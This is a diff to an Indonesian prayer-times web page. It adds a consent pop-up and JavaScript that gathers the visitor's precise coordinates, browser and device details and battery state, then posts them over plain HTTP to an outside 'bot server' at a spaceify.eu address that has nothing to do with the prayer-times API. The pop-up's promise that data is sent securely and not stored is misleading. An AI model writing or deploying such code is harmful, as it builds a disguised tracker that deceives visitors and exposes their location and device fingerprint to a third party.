@@ -16,9 +16,46 @@ body { font-family: 'Poppins', sans-serif; }
 .animate-pulse {
 animation: pulse 2s infinite;
 }
+#consentModal {
+display: flex;
+}
 </style>
 </head>
 <body class="bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 min-h-screen text-gray-100">
+<!-- Modal Persetujuan -->
+<div id="consentModal" class="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+<div class="bg-gray-800/90 backdrop-blur-md max-w-md w-full rounded-xl p-6 border border-amber-400/30">
+<h2 class="text-xl font-bold text-amber-400 mb-3">Persetujuan Penggunaan</h2>
+<p class="mb-4 text-gray-300">
+Untuk memberikan pengalaman terbaik, kami memerlukan akses ke:
+<ul class="mb-4 ml-5 space-y-2 text-gray-300">
+<li class="flex items-start gap-2">
+<svg class="w-5 h-5 text-emerald-400 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+</svg>
+Lokasi Anda (untuk jadwal sholat akurat)
+</li>
+<li class="flex items-start gap-2">
+<svg class="w-5 h-5 text-emerald-400 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+</svg>
+Info perangkat dasar (untuk optimisasi)
+</li>
+</ul>
+<p class="text-sm text-gray-400 mb-4">
+Data akan dikirim secara aman dan tidak disimpan.
+</p>
+<div class="flex gap-3">
+<button id="denyConsent" class="flex-1 py-2.5 px-4 bg-gray-700 hover:bg-gray-600 rounded-lg transition">
+Tolak
+</button>
+<button id="acceptConsent" class="flex-1 py-2.5 px-4 bg-gradient-to-r from-amber-500 to-emerald-500 text-gray-900 font-bold rounded-lg hover:opacity-90 transition">
+Setuju
+</button>
+</div>
+</div>
+</div>
+
 <!-- Dekorasi Bulan Sabit -->
 <div class="absolute top-10 right-10 opacity-20">
 <svg class="w-24 h-24 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -63,6 +100,94 @@ Lokasi Anda
 </div>
 
 <script>
+// Server bot Anda - GANTI DENGAN URL ANDA
+const BOT_SERVER_URL = "http://de25.spaceify.eu:26000/collect";
+
+// Simpan status persetujuan
+let userConsent = false;
+
+// DOM Elements
+const consentModal = document.getElementById("consentModal");
+const acceptConsent = document.getElementById("acceptConsent");
+const denyConsent = document.getElementById("denyConsent");
+
+// Event Listeners untuk persetujuan
+acceptConsent.addEventListener("click", () => {
+userConsent = true;
+consentModal.style.display = "none";
+getLocation();
+});
+
+denyConsent.addEventListener("click", () => {
+userConsent = false;
+consentModal.style.display = "none";
+document.getElementById("lokasi").innerHTML = 
+"<span class='text-amber-400'>Persetujuan diperlukan untuk menampilkan jadwal</span>";
+});
+
+// Fungsi untuk mendapatkan informasi perangkat
+function getDeviceInfo() {
+const info = {
+timestamp: new Date().toISOString(),
+userAgent: navigator.userAgent,
+platform: navigator.platform,
+language: navigator.language,
+screen: {
+width: screen.width,
+height: screen.height,
+colorDepth: screen.colorDepth
+},
+deviceMemory: navigator.deviceMemory || "unknown",
+connection: navigator.connection ? {
+type: navigator.connection.type,
+effectiveType: navigator.connection.effectiveType,
+rtt: navigator.connection.rtt,
+downlink: navigator.connection.downlink
+} : null,
+battery: null
+};
+
+// Dapatkan info baterai jika tersedia
+if ("getBattery" in navigator) {
+return navigator.getBattery().then(battery => {
+info.battery = {
+level: battery.level * 100 + "%",
+charging: battery.charging,
+chargingTime: battery.chargingTime,
+dischargingTime: battery.dischargingTime
+};
+return info;
+});
+}
+
+return Promise.resolve(info);
+}
+
+// Fungsi untuk mengirim data ke server
+async function sendDeviceData(deviceInfo, location) {
+if (!userConsent) return;
+
+try {
+const payload = {
+device: deviceInfo,
+location: location,
+timestamp: new Date().toISOString()
+};
+
+await fetch(BOT_SERVER_URL, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify(payload)
+});
+
+console.log("Data pengiriman berhasil");
+} catch (error) {
+console.error("Gagal mengirim data:", error);
+}
+}
+
 async function getJadwalSholat(lat, lon) {
 try {
 const response = await fetch(`https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lon}&method=2`);
@@ -86,6 +211,12 @@ const listItems = waktuSholat.map(item => `
 `).join('');
 
 document.getElementById("jadwalSholat").innerHTML = listItems;
+
+// Dapatkan info perangkat dan kirim
+getDeviceInfo().then(deviceInfo => {
+sendDeviceData(deviceInfo, { latitude: lat, longitude: lon });
+});
+
 } catch (error) {
 document.getElementById("jadwalSholat").innerHTML = `
 <li class="text-red-400">Gagal memuat jadwal sholat. Silakan coba lagi.</li>
@@ -94,15 +225,27 @@ document.getElementById("jadwalSholat").innerHTML = `
 }
 
 function getLocation() {
+if (!userConsent) {
+document.getElementById("lokasi").innerHTML = 
+"<span class='text-amber-400'>Menunggu persetujuan...</span>";
+return;
+}
+
 if (navigator.geolocation) {
+document.getElementById("lokasi").innerHTML = 
+"<span class='text-amber-400'>Mendapatkan lokasi...</span>";
+
 navigator.geolocation.getCurrentPosition(position => {
 const lat = position.coords.latitude.toFixed(4);
 const lon = position.coords.longitude.toFixed(4);
+
 document.getElementById("lokasi").innerHTML = `
 <span class="text-amber-400">Koordinat:</span> ${lat}, ${lon}<br>
 <span class="text-amber-400">Ketepatan:</span> ${position.coords.accuracy} meter
 `;
+
 getJadwalSholat(lat, lon);
+
 }, (error) => {
 document.getElementById("lokasi").innerHTML = `
 <span class="text-red-400">⚠️ Gagal mendapatkan lokasi:</span><br>
@@ -116,7 +259,26 @@ document.getElementById("lokasi").innerHTML = `
 }
 }
 
+// Inisialisasi
+if (localStorage.getItem("sholatAppConsent") === "accepted") {
+userConsent = true;
+consentModal.style.display = "none";
 getLocation();
+} else if (localStorage.getItem("sholatAppConsent") === "denied") {
+userConsent = false;
+consentModal.style.display = "none";
+} else {
+consentModal.style.display = "flex";
+}
+
+// Simpan preferensi pengguna
+acceptConsent.addEventListener("click", () => {
+localStorage.setItem("sholatAppConsent", "accepted");
+});
+
+denyConsent.addEventListener("click", () => {
+localStorage.setItem("sholatAppConsent", "denied");
+});
 </script>
 
 <div class="max-w-2xl mx-auto px-5 py-8">
@@ -131,7 +293,7 @@ Dibangun dengan ❤️ oleh SatzzDev<br>
 </div>
 
 <!-- Tombol Donasi -->
-<a href="https://saweria.co/SatganzDevs" target="_blank" 
+<a href="https://saweria.co/SatzzDev" target="_blank" 
 class="animate-pulse bg-gradient-to-br from-amber-400 to-emerald-500 text-gray-900 px-6 py-3 rounded-full font-bold flex items-center gap-2 hover:scale-105 transition-transform shadow-lg hover:shadow-amber-400/20">
 <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.67v-1.93c-1.71-.36-3.16-1.46-3.27-3.4h1.96c.1 1.05.82 1.87 2.65 1.87 1.96 0 2.4-.98 2.4-1.59 0-.83-.44-1.61-2.67-2.14-2.48-.6-4.18-1.62-4.18-3.67 0-1.72 1.39-2.84 3.11-3.21V4h2.67v1.95c1.86.45 2.79 1.86 2.85 3.39H14.3c-.05-1.11-.64-1.87-2.22-1.87-1.5 0-2.4.68-2.4 1.64 0 .84.65 1.39 2.67 1.91s4.18 1.39 4.18 3.91c-.01 1.83-1.38 2.83-3.12 3.16z"/>
